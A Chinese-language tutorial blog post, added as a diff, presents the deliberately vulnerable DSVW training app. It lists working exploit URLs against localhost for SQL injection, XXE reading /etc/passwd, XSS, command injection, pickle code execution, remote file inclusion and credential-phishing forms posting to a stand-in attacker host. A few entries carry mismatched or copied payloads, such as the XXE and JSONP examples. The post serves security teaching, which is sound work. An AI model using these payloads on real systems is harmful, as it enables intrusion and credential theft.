@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans" prefix="og: http://ogp.me/ns#" class="han-init">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <link rel="icon" href="/favicon.ico">
+  <title>MyKings</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox-1.3.4.css">
+  <script src="https://cdn.staticfile.org/jquery/1.7/jquery.min.js" type="text/javascript" ></script>
+</head>
+
+<body>
+	<header class="site-header navfixed-false">
+  <div class="container">
+      <h1><a href="/" title="MyKings"><span class="octicon octicon-mark-github"></span> MyKings</a></h1>
+      <nav class="site-header-nav" role="navigation">
+        
+              
+              <a href="/"  class=" site-header-nav-item hvr-underline-from-center" title="首页">首页</a>
+        
+              
+              <a href="/categories/"  class=" site-header-nav-item hvr-underline-from-center" title="分类">分类</a>
+        
+              
+              <a href="/open-source/"  class=" site-header-nav-item hvr-underline-from-center" title="开源项目">开源项目</a>
+        
+      </nav>
+  </div>
+</header>
+
+	
+<section class="collection-head geopattern" data-pattern-id="一款轻量级Web漏洞教学演示系统(DSVW)" >
+    <div class="container">
+        <div class="collection-title">
+            <h1 class="collection-header">
+                一款轻量级Web漏洞教学演示系统(DSVW)
+            </h1>
+            
+                <div class="collection-info">
+                    <span class="meta-info">
+                        <span class="octicon octicon-calendar"></span>
+                        <time datetime="2017-02-04T04:31:24.000Z" itemprop="datePublished">2017-02-04</time>
+                    </span>
+                    
+                        <span class="meta-info">
+                            <span class="octicon octicon-file-directory"></span>
+                            <a href='/categories/网络安全/' title=''>网络安全</a>
+                        </span>
+                    
+                </div>
+            
+        </div>
+    </div>
+</section>
+	<section class="container">
+    <div class="columns">
+        <!-- -->
+        <div class="column three-fourths">
+            <article class="article-content markdown-body">
+                <p><code>Damn Small Vulnerable Web</code> (DSVW) 是使用 <code>Python</code> 语言开发的 <code>Web应用漏洞</code> 的演练系统。其系统只有一个 <code>python</code> 的脚本文件组成, 当中涵盖了 26 种 <code>Web应用漏洞</code>环境, 并且脚本代码行数控制在了100行以内, 当前版本<code>v0.1m</code>。</p>
+<p>其作者是 <a href="https://github.com/stamparm" target="_blank" rel="external">Miroslav Stampar</a>, 对! 就是 <code>sqlmap</code> 同一个作者, 它支持大多数（流行的）Web漏洞环境与攻击<code>EXPLOIT</code>, 同时各个漏洞环境还提供了相关说明与介绍的链接地址。</p>
+<a id="more"></a>
+<h2 id="1-依赖环境"><a href="#1-依赖环境" class="headerlink" title="1 依赖环境"></a>1 依赖环境</h2><ul>
+<li><p>python (2.6.x 或 2.7.x)</p>
+</li>
+<li><p>依赖 <code>python-lxml</code></p>
+</li>
+</ul>
+<h2 id="2-安装使用"><a href="#2-安装使用" class="headerlink" title="2 安装使用"></a>2 安装使用</h2><p>直接克隆或者下载 <code>github</code> 中的 <a href="https://raw.githubusercontent.com/stamparm/DSVW/master/dsvw.py" target="_blank" rel="external"><code>dsvw.py</code></a> 脚本文件到本地。</p>
+<pre><code class="hljs bash">$ git clone git@github.com:stamparm/DSVW.git</code></pre>
+
+<p>运行下面命令启动。</p>
+<pre><code class="hljs bash">$ python dsvw.py
+Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code) #v0.1k
+ by: Miroslav Stampar (@stamparm)
+
+[i] running HTTP server at '127.0.0.1:65412'...</code></pre>
+
+
+<p>浏览器访问 <code>http://127.0.0.1:65412</code> 截图如下:</p>
+<p><img src="/images/dsvw/687474703a2f2f692e696d6775722e636f6d2f396e47346d77752e706e67.png" alt=""></p>
+<h2 id="3-基础背景"><a href="#3-基础背景" class="headerlink" title="3. 基础背景"></a>3. 基础背景</h2><h3 id="3-1-数据库"><a href="#3-1-数据库" class="headerlink" title="3.1 数据库"></a>3.1 数据库</h3><p>需要注意的是<code>DSVW</code>中的SQL数据库使用的是SQLITE3, 并且创建了 <code>users</code> 与 <code>comments</code> 两张表。</p>
+<p><strong><code>users</code> 表</strong></p>
+<table>
+<thead>
+<tr>
+<th>字段名</th>
+<th style="text-align:left">字段类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><font size="2">id</font></td>
+<td style="text-align:left"><font size="2">INTEGER</font></td>
+</tr>
+<tr>
+<td><font size="2">username</font></td>
+<td style="text-align:left"><font size="2">TEXT</font></td>
+</tr>
+<tr>
+<td><font size="2">name</font></td>
+<td style="text-align:left"><font size="2">TEXT</font></td>
+</tr>
+<tr>
+<td><font size="2">surname</font></td>
+<td style="text-align:left"><font size="2">TEXT</font></td>
+</tr>
+<tr>
+<td><font size="2">password</font></td>
+<td style="text-align:left"><font size="2">TEXT</font></td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>users</code> 表中的内容:</strong></p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th style="text-align:left">username</th>
+<th style="text-align:left">name</th>
+<th style="text-align:left">surname</th>
+<th style="text-align:left">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><font size="2">1</font></td>
+<td style="text-align:left"><font size="2">admin</font></td>
+<td style="text-align:left"><font size="2">admin</font></td>
+<td style="text-align:left"><font size="2">admin</font></td>
+<td style="text-align:left"><font size="2">7en8aiDoh!</font></td>
+</tr>
+<tr>
+<td><font size="2">2</font></td>
+<td style="text-align:left"><font size="2">dricci</font></td>
+<td style="text-align:left"><font size="2">dian</font></td>
+<td style="text-align:left"><font size="2">ricci</font></td>
+<td style="text-align:left"><font size="2">12345!</font></td>
+</tr>
+<tr>
+<td><font size="2">3</font></td>
+<td style="text-align:left"><font size="2">amason</font></td>
+<td style="text-align:left"><font size="2">anthony</font></td>
+<td style="text-align:left"><font size="2">mason</font></td>
+<td style="text-align:left"><font size="2">gandalf</font></td>
+</tr>
+<tr>
+<td><font size="2">4</font></td>
+<td style="text-align:left"><font size="2">svargas</font></td>
+<td style="text-align:left"><font size="2">sandra</font></td>
+<td style="text-align:left"><font size="2">vargas</font></td>
+<td style="text-align:left"><font size="2">phest1945</font></td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>comments</code> 表</strong></p>
+<table>
+<thead>
+<tr>
+<th>字段名</th>
+<th style="text-align:left">字段类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><font size="2">id</font></td>
+<td style="text-align:left"><font size="2">INTEGER</font></td>
+</tr>
+<tr>
+<td><font size="2">comment</font></td>
+<td style="text-align:left"><font size="2">TEXT</font></td>
+</tr>
+<tr>
+<td><font size="2">time</font></td>
+<td style="text-align:left"><font size="2">TEXT</font></td>
+</tr>
+</tbody>
+</table>
+<h3 id="3-2-XML配置"><a href="#3-2-XML配置" class="headerlink" title="3.2 XML配置"></a>3.2 XML配置</h3><pre><code class="hljs xml">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;users&gt;
+    &lt;user id="0"&gt;
+        &lt;username&gt;admin&lt;/username&gt;
+        &lt;name&gt;admin&lt;/name&gt;
+        &lt;surname&gt;admin&lt;/surname&gt;
+        &lt;password&gt;7en8aiDoh!&lt;/password&gt;
+    &lt;/user&gt;
+    &lt;user id="1"&gt;
+        &lt;username&gt;dricci&lt;/username&gt;
+        &lt;name&gt;dian&lt;/name&gt;
+        &lt;surname&gt;ricci&lt;/surname&gt;
+        &lt;password&gt;12345&lt;/password&gt;
+    &lt;/user&gt;
+    &lt;user id="2"&gt;
+        &lt;username&gt;amason&lt;/username&gt;
+        &lt;name&gt;anthony&lt;/name&gt;
+        &lt;surname&gt;mason&lt;/surname&gt;
+        &lt;password&gt;gandalf&lt;/password&gt;
+    &lt;/user&gt;
+    &lt;user id="3"&gt;
+        &lt;username&gt;svargas&lt;/username&gt;
+        &lt;name&gt;sandra&lt;/name&gt;
+        &lt;surname&gt;vargas&lt;/surname&gt;
+        &lt;password&gt;phest1945&lt;/password&gt;
+    &lt;/user&gt;
+&lt;/users&gt;</code></pre>
+
+<h2 id="4-漏洞类型"><a href="#4-漏洞类型" class="headerlink" title="4 漏洞类型"></a>4 漏洞类型</h2><h3 id="4-1-注入漏洞"><a href="#4-1-注入漏洞" class="headerlink" title="4.1 注入漏洞"></a>4.1 注入漏洞</h3><h4 id="4-1-1-Blind-SQL-Injection-boolean"><a href="#4-1-1-Blind-SQL-Injection-boolean" class="headerlink" title="4.1.1 Blind SQL Injection (boolean)"></a>4.1.1 Blind SQL Injection (boolean)</h4><p><strong>基于布尔型的盲注</strong>: HTTP请求的响应体中不会明确的返回SQL的错误信息, 当把参数送入程序查询时，并且在查询条件为真的情况下返回正常页面，条件为假时程序会重定向到或者返回一个自定义的错误页面。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?id=2</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?id=2 AND SUBSTR((SELECT password FROM users WHERE name='admin'),1,1)='7'`</code></pre>
+
+
+<h4 id="4-1-2-Blind-SQL-Injection-time"><a href="#4-1-2-Blind-SQL-Injection-time" class="headerlink" title="4.1.2 Blind SQL Injection (time)"></a>4.1.2 Blind SQL Injection (time)</h4><p><strong>基于时间型的盲注</strong>: 与布尔型盲注类似, 当把参数送入程序查询时，通过判断服务器响应时所花费的时间, 如果延迟大于等于<code>Payload</code>中设定的值时就可判断查询结果为真, 否则为假。不同的BDMS使用的方法和技巧略有不同。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?id=1</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?id=1 and (SELECT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE name='admin'),2,1)='e') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))) ELSE 0 END))</code></pre>
+
+<blockquote>
+<p>这个漏洞环境用到了 SQLITE3 中的 CASE 窗口函数与 RANDOMBLOB 来实现的基于时间的盲注。<br>MSQL: <code>sleep(2)</code><br>MSSQL: <code>WAITFOR DELAY &#39;0:0:2&#39;</code></p>
+</blockquote>
+<h4 id="4-1-3-UNION-SQL-Injection"><a href="#4-1-3-UNION-SQL-Injection" class="headerlink" title="4.1.3 UNION SQL Injection"></a>4.1.3 UNION SQL Injection</h4><p><strong>基于联合查询注入</strong>: 使用<code>UNION</code>运算符用于SQL注入，<code>UNION</code>运算符是关联两个表的查询结果。攻击者故意伪造的恶意的查询并加入到原始查询中, 伪造的查询结果将被合并到原始查询的结果返回，攻击者会获得其他表的信息。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?id=2</code>, </p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://localhost:65412/?id=2 UNION ALL SELECT NULL, NULL, NULL, (SELECT id||','||username||','||password FROM users WHERE username='admin')</code></pre>
+
+
+<h4 id="4-1-4-Login-Bypass"><a href="#4-1-4-Login-Bypass" class="headerlink" title="4.1.4 Login Bypass"></a>4.1.4 Login Bypass</h4><p><strong>登陆绕过</strong>: 这里是基于SQL注入的一种绕过方式。登陆验证的逻辑没有验证和过滤输入字符直接带到sql进行查询,所以产生漏洞。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://localhost:65412/login?username=&amp;password=</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://localhost:65412/login?username=admin&password=' OR '1' LIKE '1</code></pre>
+
+
+<h4 id="4-1-5-XML-External-Entity-local"><a href="#4-1-5-XML-External-Entity-local" class="headerlink" title="4.1.5 XML External Entity (local)"></a>4.1.5 XML External Entity (local)</h4><p><strong>XML实体注入(本地)</strong>: 在使用XML通信的服务中(如: SOAP服务)。Web系统没有验证与用户通信中XML格式, 攻击者可以构造恶意的XML文件来访问本地服务器上的资源信息。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?xml=%3Croot%3E%3C%2Froot%3E</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://localhost:65412/login?username=admin&password=' OR '1' LIKE '1</code></pre>
+
+
+<h4 id="4-1-6-XML-External-Entity-remote"><a href="#4-1-6-XML-External-Entity-remote" class="headerlink" title="4.1.6 XML External Entity (remote)"></a>4.1.6 XML External Entity (remote)</h4><p><strong>XML实体注入(远程)</strong>: 在使用XML通信的服务中(如: SOAP服务)。Web系统没有验证与用户通信中XML格式, 攻击者可以构造恶意的XML文件来将受害服务器的敏感信息上传到攻击者的服务器上严重的可以反弹shell。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://localhost:65412/login?username=&amp;password=</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?xml=<!DOCTYPE example [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root></code></pre>
+
+
+<h4 id="4-1-7-Blind-XPath-Injection-boolean"><a href="#4-1-7-Blind-XPath-Injection-boolean" class="headerlink" title="4.1.7 Blind XPath Injection (boolean)"></a>4.1.7 Blind XPath Injection (boolean)</h4><p><strong>XPath注入</strong>: 与SQL注入类似，当网站使用用户提交的信息来构造XML数据的XPath查询时，会发生XPath注入攻击。 通过将有意的畸形信息发送到网站，攻击者可以了解XML数据的结构，或访问他通常不能访问的数据。 如果XML数据用于认证（例如基于XML的用户文件），他甚至可以提升其在网站上的权限。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://localhost:65412/login?username=&amp;password=</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?name=admin' and substring(password/text(),3,1)='n</code></pre>
+
+<blockquote>
+<p>XPath 是一门在 XML 文档中查找信息的语言。XPath 可用来在 XML 文档中对元素和属性进行遍历。<br>XPath 是 W3C XSLT 标准的主要元素，并且 XQuery 和 XPointer 都构建于 XPath 表达之上。<br>因此，对 XPath 的理解是很多高级 XML 应用的基础。</p>
+</blockquote>
+<h3 id="4-2-跨站漏洞"><a href="#4-2-跨站漏洞" class="headerlink" title="4.2 跨站漏洞"></a>4.2 跨站漏洞</h3><h4 id="4-2-1-Cross-Site-Scripting-reflected"><a href="#4-2-1-Cross-Site-Scripting-reflected" class="headerlink" title="4.2.1 Cross Site Scripting (reflected)"></a>4.2.1 Cross Site Scripting (reflected)</h4><p><strong>反射型跨站脚本攻击</strong>: 当攻击者在单个HTTP响应中插入浏览器可执行代码(HTML或JAVASCRIPT)时, 会发生反射跨站点脚本攻击。注入的恶意代码不会存储在应用程序后端, 它是非持久性的，只会影响打开恶意的链接或第三方网页的用户。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?v=0.2</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?v=0.2&lt;script&gt;alert("arbitrary javascript")&lt;/script&gt;</code></pre>
+
+<h4 id="4-2-2-Cross-Site-Scripting-stored"><a href="#4-2-2-Cross-Site-Scripting-stored" class="headerlink" title="4.2.2 Cross Site Scripting (stored)"></a>4.2.2 Cross Site Scripting (stored)</h4><p><strong>存储型跨站脚本攻击</strong>: 存储跨站脚本是最危险的跨站脚本类型, 其原理是Web系统会将攻击者提交的恶意代码存储到数据库中或是服务器后端里。只要受害者浏览到存在恶意代码页面, 就被执行恶意代码。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?comment=</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?comment=&lt;script&gt;alert("arbitrary javascript")&lt;/script&gt;</code></pre>
+
+<h4 id="4-2-3-Cross-Site-Scripting-DOM"><a href="#4-2-3-Cross-Site-Scripting-DOM" class="headerlink" title="4.2.3 Cross Site Scripting (DOM)"></a>4.2.3 Cross Site Scripting (DOM)</h4><p><strong>DOM型跨站脚本攻击</strong>: 基于DOM的跨站脚本是XSS bug的事实上的名字，它是页面上通常是JavaScript的活动浏览器端内容的结果，获取用户输入，然后做一些不安全的事情，导致注入代码的执行。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?#lang=en</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?foobar#lang=en&lt;script&gt;alert("arbitrary javascript")&lt;/script&gt;</code></pre>
+
+<h4 id="4-2-4-Cross-Site-Scripting-JSONP"><a href="#4-2-4-Cross-Site-Scripting-JSONP" class="headerlink" title="4.2.4 Cross Site Scripting (JSONP)"></a>4.2.4 Cross Site Scripting (JSONP)</h4><p><strong>JSONP劫持</strong>: 网站中通过 <code>JSONP</code> 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?#lang=en</code></p>
+<p><strong>EXPLOIT</strong>: </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?foobar#lang=en&lt;script&gt;alert("arbitrary javascript")&lt;/script&gt;</code></pre>
+
+<h4 id="4-2-5-Cross-Site-Request-Forgery"><a href="#4-2-5-Cross-Site-Request-Forgery" class="headerlink" title="4.2.5 Cross Site Request Forgery"></a>4.2.5 Cross Site Request Forgery</h4><p><strong>跨站请求伪造</strong>: 会导致受害者在当前被认证的Web应用程序上执行一些 “非正常授权” 的操作。通常这类攻击需要借助第三方（如:通过邮件、私信、聊天发送链接等）的一些帮助，攻击者可以强制Web应用程序的用户执行攻击者选择的操作。当受害者是普通用户时, CSRF攻击可能会影响最终用户数据和操作;  如果受害者是管理员帐户，CSRF攻击可能会危及整个Web应用程序系统的安全。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?comment=</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?v=&lt;img src="/?comment=&lt;div style="color:red; font-weight: bold"&gt;I quit the job&lt;/div&gt;"&gt;</code></pre>
+
+<blockquote>
+<p>这里使用了&lt;img&gt;标签来自动发布了一个红色字体的<code>I quit the job</code>评论。</p>
+</blockquote>
+<h3 id="4-3-其他漏洞"><a href="#4-3-其他漏洞" class="headerlink" title="4.3 其他漏洞"></a>4.3 其他漏洞</h3><h4 id="4-3-1-HTTP-Parameter-Pollution"><a href="#4-3-1-HTTP-Parameter-Pollution" class="headerlink" title="4.3.1 HTTP Parameter Pollution"></a>4.3.1 HTTP Parameter Pollution</h4><p><strong>HTTP参数污染</strong>: 当使用GET或者POST方法提交参数时, 请求体中包含了多个相同名称而不同值的参数。由于不同的语言与Web容器处理的方式不同, 结合业务场景会产生不同的影响。 通过利用这些影响，攻击者可能能够绕过输入验证，触发应用程序错误或修改内部变量值等风险。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/login?username=admin&amp;password=</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/login?username=admin&password='/*&password=*/OR/*&password=*/'1'/*&password=*/LIKE/*&password=*/'1</code></pre>
+
+<blockquote>
+<p>这里使用了HTTP参数污染来模拟绕过WAF</p>
+</blockquote>
+<h4 id="4-3-2-Server-Side-Request-Forgery"><a href="#4-3-2-Server-Side-Request-Forgery" class="headerlink" title="4.3.2 Server Side Request Forgery"></a>4.3.2 Server Side Request Forgery</h4><p><strong>服务器端请求伪造</strong>: 一种由攻击者构造形成的指令并由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统资源。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?path=</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?path=http://127.0.0.1:80</code></pre>
+
+<blockquote>
+<p>如果 IP 地址 127.0.0.1 开放了 80 端口, 那么返回得到的信息, 否则返回一个 500 错误。</p>
+</blockquote>
+<h4 id="4-3-3-Frame-Injection-phishing"><a href="#4-3-3-Frame-Injection-phishing" class="headerlink" title="4.3.3 Frame Injection (phishing)"></a>4.3.3 Frame Injection (phishing)</h4><p><strong>Frame注入(钓鱼)</strong>: 属于XSS的范畴, 将HTML的标签注入到存在漏洞的HTTP响应体中, 如: iframe标签。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?v=0.2</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?v=0.2&lt;iframe src="http://attacker.co.nf/i/login.html" style="background-color:white;z-index:10;top:10%;left:10%;position:fixed;border-collapse:collapse;border:1px solid #a8a8a8"&gt;&lt;/iframe&gt;</code></pre>
+
+<h4 id="4-3-4-Frame-Injection-content-spoofing"><a href="#4-3-4-Frame-Injection-content-spoofing" class="headerlink" title="4.3.4 Frame Injection (content spoofing)"></a>4.3.4 Frame Injection (content spoofing)</h4><p><strong>Frame注入(内容欺骗)</strong>: 同上原理。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?v=0.2</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?v=0.2&lt;iframe src="http://attacker.co.nf/i/login.html" style="background-color:white;z-index:10;top:10%;left:10%;position:fixed;border-collapse:collapse;border:1px solid #a8a8a8"&gt;&lt;/iframe&gt;</code></pre>
+
+
+<h4 id="4-3-5-Clickjacking"><a href="#4-3-5-Clickjacking" class="headerlink" title="4.3.5 Clickjacking"></a>4.3.5 Clickjacking</h4><p><strong>点击劫持</strong>: 是一种恶意技术，其包括欺骗Web用户让他们认为正在与交互的东西的交互（在大多数情况下通过点击, 这种技术手段运用最多的就是广告）。 这种类型的攻击可以单独使用或与其他攻击结合使用，在受害者与看似无害的网页进行交互时，可能会发送未经授权的命令或泄露机密信息。</p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?v=0.2&lt;div style="opacity:0;filter:alpha(opacity=20);background-color:#000;width:100%;height:100%;z-index:10;top:0;left:0;position:fixed;" onclick="document.location='http://attacker.co.nf/'"&gt;&lt;/div&gt;&lt;script&gt;alert("click anywhere on page");&lt;/script&gt;</code></pre>
+
+
+<h4 id="4-3-6-Unvalidated-Redirect"><a href="#4-3-6-Unvalidated-Redirect" class="headerlink" title="4.3.6 Unvalidated Redirect"></a>4.3.6 Unvalidated Redirect</h4><p><strong>未验证的重定向</strong>: 当Web应用程序接受不受信任的输入时，可能会导致Web应用程序将请求重定向到包含在不受信任的输入中的URL，从而可能导致未经验证的重定向和转发。 通过将不受信任的URL输入修改为恶意网站，攻击者可能会成功启动网络钓鱼诈骗并窃取用户凭据。 由于修改链接中的服务器名称与原始网站相同，因此网络钓鱼尝试可能具有更可信的外观。 未验证的重定向和转发攻击也可用于恶意制作一个URL，该URL将通过应用程序的访问控制检查，然后将攻击者转发到他们通常无法访问的特权功能。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?redir=</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?redir=http://attacker.co.nf</code></pre>
+
+
+<h4 id="4-3-7-Arbitrary-Code-Execution"><a href="#4-3-7-Arbitrary-Code-Execution" class="headerlink" title="4.3.7 Arbitrary Code Execution"></a>4.3.7 Arbitrary Code Execution</h4><p><strong>任意代码执行</strong>: 开发人员没有严格验证用户输入的数据, 在某些特殊业务场景中, 用户可构造出恶意的代码或系统命令, 来获得服务器上的敏感信息或者得到服务器的控制权限。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?domain=www.google.com</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?domain=www.google.com; ifconfig</code></pre>
+
+
+<h4 id="4-3-8-Full-Path-Disclosure"><a href="#4-3-8-Full-Path-Disclosure" class="headerlink" title="4.3.8 Full Path Disclosure"></a>4.3.8 Full Path Disclosure</h4><p><strong>完整路径泄露</strong>: 全路径泄露漏洞使攻击者能够看到Web应用程序在服务器端的完整路径(例如：/var/www/html/)。攻击者会结合其他漏洞对Web系统进一步的攻击(如: 写 Webshell)。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?path=</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?path=foobar</code></pre>
+
+
+<h4 id="4-3-9-Source-Code-Disclosure"><a href="#4-3-9-Source-Code-Disclosure" class="headerlink" title="4.3.9 Source Code Disclosure"></a>4.3.9 Source Code Disclosure</h4><p><strong>源码泄露</strong>: 该漏洞会造成允许未授权用户获得服务器端应用程序的源代码。此漏洞会造成企业内部的敏感信息泄露或容易遭受恶意攻击者攻击。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?path=</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?path=dsvw.py</code></pre>
+
+
+<h4 id="4-3-10-Path-Traversal"><a href="#4-3-10-Path-Traversal" class="headerlink" title="4.3.10 Path Traversal"></a>4.3.10 Path Traversal</h4><p><strong>路径穿越</strong>: 路径遍历攻击（也称为目录遍历）旨在访问存储在Web根文件夹外部的文件和目录。通过使用 “../” 或 “..\” 等相对文件路径方式来操纵引用文件的变量，该漏洞会允许访问存储在文件系统上的任意文件和目录。 </p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?path=</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?path=../../../../../../etc/passwd</code></pre>
+
+
+<h4 id="4-3-11-File-Inclusion-remote"><a href="#4-3-11-File-Inclusion-remote" class="headerlink" title="4.3.11 File Inclusion (remote)"></a>4.3.11 File Inclusion (remote)</h4><p><strong>远程文件包含</strong>: 通常利用目标应用程序中实现的 “动态文件包含” 机制，允许攻击者包括一个远程文件。 由于对用户输入的数据没有进行适当的验证，导致出现漏洞。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?include=</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?include=http://pastebin.com/raw.php?i=N5ccE6iH&cmd=ifconfig</code></pre>
+
+
+<h4 id="4-3-12-HTTP-Header-Injection-phishing"><a href="#4-3-12-HTTP-Header-Injection-phishing" class="headerlink" title="4.3.12 HTTP Header Injection (phishing)"></a>4.3.12 HTTP Header Injection (phishing)</h4><p><strong>HTTP响应头拆分(钓鱼)</strong>: 用户提交的部分参数, 没有经过验证或过滤直接在响应头中输出, 由于HTTP的Header中使用了CRLF(url中的%0d%0a)来分割各个字段中的数据。恶意用户可以构造特殊的数据应该欺骗钓鱼。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?charset=utf8</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body style='font: 12px monospace'&gt;&lt;form action="http://attacker.co.nf/i/log.php" onSubmit="alert('visit \'http://attacker.co.nf/i/log.txt\' to see your phished credentials')"&gt;Username:&lt;br&gt;&lt;input type="text" name="username"&gt;&lt;br&gt;Password:&lt;br&gt;&lt;input type="password" name="password"&gt;&lt;input type="submit" value="Login"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>
+
+
+<h4 id="4-3-13-Component-with-Known-Vulnerability-pickle"><a href="#4-3-13-Component-with-Known-Vulnerability-pickle" class="headerlink" title="4.3.13 Component with Known Vulnerability (pickle)"></a>4.3.13 Component with Known Vulnerability (pickle)</h4><p><strong>使用含有已知漏洞的组件(pickle)</strong>: pickle存在一个文件序列化漏洞。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?object=%28dp0%0AS%27admin%27%0Ap1%0A%28S%27admin%27%0Ap2%0AS%27admin%27%0Ap3%0Atp4%0AsS%27dricci%27%0Ap5%0A%28S%27dian%27%0Ap6%0AS%27ricci%27%0Ap7%0Atp8%0AsS%27amason%27%0Ap9%0A%28S%27anthony%27%0Ap10%0AS%27mason%27%0Ap11%0Atp12%0AsS%27svargas%27%0Ap13%0A%28S%27sandra%27%0Ap14%0AS%27vargas%27%0Ap15%0Atp16%0As.</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?object=cos%0Asystem%0A(S%27ping%20-c%205%20127.0.0.1%27%0AtR.%0A</code></pre>
+
+<blockquote>
+<p>这里执行了ping -c 5 127.0.0.1 命令</p>
+</blockquote>
+<h4 id="4-3-14-Denial-of-Service-memory"><a href="#4-3-14-Denial-of-Service-memory" class="headerlink" title="4.3.14 Denial of Service (memory)"></a>4.3.14 Denial of Service (memory)</h4><p><strong>拒绝服务(memory)</strong>: 资源消耗型的 DoS 攻击, 通过大量的恶意请求来访问有缺陷的服务, 从而造成服务器的系统资源消耗(如: CPU利用率100%、内存耗尽等) 增大, 来影响正常用户的使用。往往会造成正常用户的无法打开或无法访问等一系列问题。</p>
+<p><strong>漏洞地址</strong>:<br><code>http://127.0.0.1:65412/?size=32</code></p>
+<p><strong>EXPLOIT</strong>:  </p>
+<pre><code class="hljs bash">http://127.0.0.1:65412/?size=9999999</code></pre>
+
+
